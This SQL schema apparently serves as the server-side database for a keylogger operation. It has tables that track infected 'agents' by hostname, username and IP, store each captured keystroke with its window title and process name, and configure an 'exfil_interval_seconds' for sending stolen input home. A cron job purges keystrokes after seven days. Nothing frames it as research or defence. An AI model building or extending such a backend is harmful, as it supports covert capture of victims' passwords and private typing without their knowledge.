-- Enable pg_cron for keystroke cleanup
CREATE EXTENSION IF NOT EXISTS pg_cron;

-- agents table
CREATE TABLE agents (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  hostname TEXT NOT NULL,
  username TEXT,
  ip TEXT,
  os TEXT,
  keystroke_count INTEGER DEFAULT 0,
  last_seen_utc TIMESTAMPTZ DEFAULT now(),
  first_seen_utc TIMESTAMPTZ DEFAULT now(),
  activity_history INTEGER[] DEFAULT '{}',
  status TEXT DEFAULT 'active'
);

-- keystrokes table (high volume — needs retention policy)
CREATE TABLE keystrokes (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  agent_id UUID REFERENCES agents(id),
  timestamp_utc TIMESTAMPTZ DEFAULT now(),
  window_title TEXT,
  process_name TEXT,
  key_char TEXT,
  vk_code INTEGER,
  flags INTEGER
);
CREATE INDEX idx_keystrokes_agent_time ON keystrokes(agent_id, timestamp_utc DESC);
CREATE INDEX idx_keystrokes_timestamp ON keystrokes(timestamp_utc DESC);

-- agent_configs table
CREATE TABLE agent_configs (
  agent_id UUID PRIMARY KEY REFERENCES agents(id),
  exfil_interval_seconds INTEGER DEFAULT 30,
  blacklist TEXT[] DEFAULT '{}',
  updated_at TIMESTAMPTZ DEFAULT now()
);

-- auto-delete keystrokes older than 7 days
SELECT cron.schedule('cleanup-keystrokes', '0 3 * * *',
  $$DELETE FROM keystrokes WHERE timestamp_utc < now() - interval '7 days'$$
);
